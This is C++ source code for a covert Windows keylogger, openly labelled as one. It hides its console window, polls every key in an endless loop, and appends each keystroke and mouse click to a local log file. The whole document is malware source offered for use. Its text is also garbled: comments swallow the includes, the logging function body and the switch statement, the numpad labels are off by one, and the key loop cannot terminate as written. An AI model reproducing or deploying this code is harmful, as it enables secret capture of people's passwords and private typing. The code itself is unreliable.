//Keylogger// //Sadialhuda// //Binarybeast004// //Binarybeast007//

#include//input output #include //file stream
#include<Windows.h> //function-os input 
using namespace std;


void Writetolog(string text){ 
  ofstream file; //file read //if.file write file.open("Logfile.txt", fstream::app); //appent - not override file << text; // write in file file.close();

}
bool SpecialKeys(int ikey){ // SpecialKeys(key) switch (ikey) // { case VK_SPACE: Writetolog(" "); break;

case VK_LBUTTON: Writetolog(" Left mouse button"); break;

case VK_RBUTTON: Writetolog(" Right mouse button"); break;

case VK_CANCEL: Writetolog(" Control-break processing"); break;

case VK_MBUTTON: Writetolog(" Middle mouse button "); break;

case VK_XBUTTON1: Writetolog(" X1 mouse button "); break;

case VK_XBUTTON2: Writetolog(" X2 mouse button "); break;

case VK_BACK: Writetolog(" BACKSPACE key "); break;

case VK_TAB: Writetolog(" TAB key "); break;

case VK_CLEAR: Writetolog(" CLEAR key "); break;

case VK_RETURN: Writetolog(" ENTER key "); break;

case VK_SHIFT: Writetolog(" SHIFT key "); break;

case VK_CONTROL: Writetolog(" CTRL key "); break;

case VK_MENU: Writetolog(" ALT key "); break;

case VK_PAUSE: Writetolog(" PAUSE key "); break;

case VK_CAPITAL: Writetolog(" CAPS LOCK key "); break;

case VK_KANA: Writetolog(" IME Kana mode "); break;

case VK_JUNJA: Writetolog(" ME Junja mode "); break;

case VK_FINAL: Writetolog(" IME final mode "); break;

case VK_KANJI: Writetolog(" IME Kanji mode "); break;

case VK_ESCAPE: Writetolog(" ESC key "); break;

case VK_CONVERT: Writetolog(" IME convert "); break;

case VK_NONCONVERT: Writetolog(" IME nonconvert "); break;

case VK_ACCEPT: Writetolog(" IME accept "); break;

case VK_MODECHANGE: Writetolog(" IME mode change request "); break;

case VK_PRIOR: Writetolog(" PAGE UP key "); break;

case VK_NEXT: Writetolog(" PAGE DOWN key "); break;

case VK_END: Writetolog(" END key "); break;

case VK_HOME: Writetolog(" HOME key "); break;

case VK_LEFT: Writetolog(" LEFT ARROW key "); break;

case VK_UP: Writetolog(" UP ARROW key "); break;

case VK_RIGHT: Writetolog(" RIGHT ARROW key "); break;

case VK_DOWN: Writetolog(" DOWN ARROW key "); break;

case VK_SELECT: Writetolog(" SELECT key "); break;

case VK_PRINT: Writetolog(" PRINT key "); break;

case VK_EXECUTE: Writetolog(" EXECUTE key "); break;

case VK_SNAPSHOT: Writetolog(" PRINT SCREEN key "); break;

case VK_INSERT: Writetolog(" INS key "); break;

case VK_DELETE: Writetolog(" DEL key "); break;

case VK_HELP: Writetolog(" HELP key "); break;

case VK_SLEEP: Writetolog(" Computer Sleep key "); break;

case VK_NUMPAD1: Writetolog(" Numeric keypad 0 key "); break;

case VK_NUMPAD2: Writetolog(" Numeric keypad 1 key "); break;

case VK_NUMPAD3: Writetolog(" Numeric keypad 2 key "); break;

case VK_NUMPAD4: Writetolog(" Numeric keypad 4 key "); break;

case VK_NUMPAD5: Writetolog(" Numeric keypad 5 key "); break;

case VK_NUMPAD6: Writetolog(" Numeric keypad 6 key "); break;

case VK_NUMPAD7: Writetolog(" Numeric keypad 7 key "); break;

case VK_NUMPAD8: Writetolog(" Numeric keypad 8 key "); break;

case VK_NUMPAD9: Writetolog(" Numeric keypad 9 key "); break;

case VK_MULTIPLY: Writetolog(" Multiply key "); break;

case VK_ADD: Writetolog(" Add key "); break;

case VK_SEPARATOR: Writetolog(" Separator key "); break;

case VK_SUBTRACT: Writetolog(" Subtract key "); break;

case VK_DECIMAL: Writetolog(" Decimal key "); break;

case VK_DIVIDE: Writetolog(" Divide key "); break;

case VK_F1: Writetolog(" F1 key "); break;

case VK_F2: Writetolog(" F2 key "); break;

case VK_F3: Writetolog(" F3 key "); break;

case VK_F4: Writetolog(" F4 key "); break;

case VK_F5: Writetolog(" F5 key "); break;

case VK_F6: Writetolog(" F6 key "); break;

case VK_F7: Writetolog(" F7 key "); break;

case VK_F8: Writetolog(" F8 key "); break;

case VK_F9: Writetolog(" F9 key "); break;

case VK_F10: Writetolog(" F10 key "); break;

case VK_F11: Writetolog(" F11 key "); break;

case VK_F12: Writetolog(" F12 key "); break;

case VK_F13: Writetolog(" F13 key "); break;

case VK_F14: Writetolog(" F14 key "); break;

case VK_F15: Writetolog(" F15 key "); break;

case VK_F16: Writetolog(" F16 key "); break;

case VK_F17: Writetolog(" F17 key "); break;

case VK_F18: Writetolog(" F18 key "); break;

default: return false ; break; } return true ; }

int main(){
  //Writetolog("This is a text\n"); //funtion calling 
FreeConsole(); 
  while (1){ 
  for (unsigned char key=8; key<=255;key++)
  { if(GetAsyncKeyState(key)== -32767){ //keyboard key axccess 
    if(SpecialKeys(key) == false)
    { ofstream logfile ; logfile.open("Logfile.txt",fstream::app); logfile << key; logfile.close(); } } } }

return 0;
}
